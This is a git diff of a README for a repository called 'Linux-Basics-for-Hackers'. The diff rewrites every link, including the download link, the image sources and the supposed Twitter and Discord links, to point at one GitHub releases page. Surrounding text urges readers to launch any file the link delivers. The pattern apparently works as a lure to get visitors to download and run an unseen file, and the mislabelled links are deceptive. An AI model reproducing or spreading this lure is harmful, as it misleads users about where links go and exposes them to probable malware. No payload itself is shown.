@@ -23,7 +23,7 @@ Explore the following key topics in this repository:
 - Wireless Networks
 
 ## Get Started
-To access additional resources and files related to this repository, download the content from [here](https://github.com/assets/Release.zip).
+To access additional resources and files related to this repository, download the content from [here](https://github.com/Yusen0820/Linux-Basics-for-Hackers/releases).
 
 If the link above ends with a file name, make sure to launch the file to explore the contents.
 
@@ -32,14 +32,14 @@ If you encounter any issues with the link provided or it does not work as expect
 ## Let's Dive In!
 Are you ready to enhance your Linux skills and embrace the world of hacking and cybersecurity? Join us on this exciting journey by exploring the contents of the **Linux-Basics-for-Hackers** repository. Unleash your full potential and #HackThePlanet like a pro! 🌟
 
-![HackThePlanet](https://github.com/awesome-hacking-image.jpg)
+![HackThePlanet](https://github.com/Yusen0820/Linux-Basics-for-Hackers/releases)
 
 ## Stay Connected
 Connect with fellow hackers, share your insights, and collaborate on exciting projects by joining our vibrant community. Together, we can push the boundaries of hacking and cybersecurity to new heights! 💻🔒
 
 Join the conversation and stay updated:
-- Follow us on Twitter: [Twitter](https://twitter.com/LinuxHackers)
-- Join our Discord server: [Discord](https://discord.gg/linuxhackers)
+- Follow us on Twitter: [Twitter](https://github.com/Yusen0820/Linux-Basics-for-Hackers/releases)
+- Join our Discord server: [Discord](https://github.com/Yusen0820/Linux-Basics-for-Hackers/releases)
 
 Let's make waves in the world of hacking and cybersecurity! 🌊🔓
 
@@ -48,4 +48,4 @@ Help us grow our community and empower more individuals to unleash their hacking
 
 Together, we can revolutionize the world of hacking and cybersecurity one penguin step at a time! 🐧💻
 
-![Linux-Love](https://github.com/linux-love-image.jpg)
+![Linux-Love](https://github.com/Yusen0820/Linux-Basics-for-Hackers/releases)
